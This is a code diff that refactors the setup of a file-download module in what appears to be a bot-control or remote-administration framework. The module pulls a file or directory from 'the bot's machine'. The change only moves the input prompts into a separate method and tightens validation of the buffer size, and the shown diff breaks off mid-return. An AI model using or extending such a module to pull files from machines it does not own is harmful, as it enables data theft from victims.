@@ -16,21 +16,29 @@ class Module(ModuleABC):
             "Stoppable": False
         }
 
-    def setup(self) -> Tuple[bool, Optional[dict]]:
-        download_file = self._view.prompt("Path to file or directory on the bot's machine: ")
-        buffer_size = self._view.prompt("Buffer size [ENTER for 4096 bytes]: ")
-        output_name = self._view.prompt("Local output name [ENTER for <RANDOM>]: ")
+    def get_setup_messages(self) -> List[str]:
+        return [
+            "Path to file or directory on the bot's machine: ",
+            "Buffer size (Leave empty for 4096 bytes): ",
+            "Local output name (Leave empty for <RANDOM>): "
+        ]
+
+    def setup(self, set_options: list) -> Tuple[bool, Optional[dict]]:
+        download_file = set_options[0]
+        buffer_size = set_options[1]
+        output_name = set_options[2]
 
         if not buffer_size:
             buffer_size = 4096
-        elif type(buffer_size) is not int:
-            self._view.output("Invalid buffer size, using 4096.", "info")
-            buffer_size = 4096
+        elif not str(buffer_size).isdigit():
+            self._view.display_error("Invalid buffer size.")
+            return False, None
+
         if not output_name:
             output_name = random_string(8) + path.splitext(download_file)[1]
 
         if path.exists(path.join(OUTPUT_DIRECTORY, path.basename(download_file))):
-            self._view.output("A local file with that name already exists!", "attention")
+            self._view.display_error("A local file with that name already exists!")
             return False, None
         else:
             return True, {
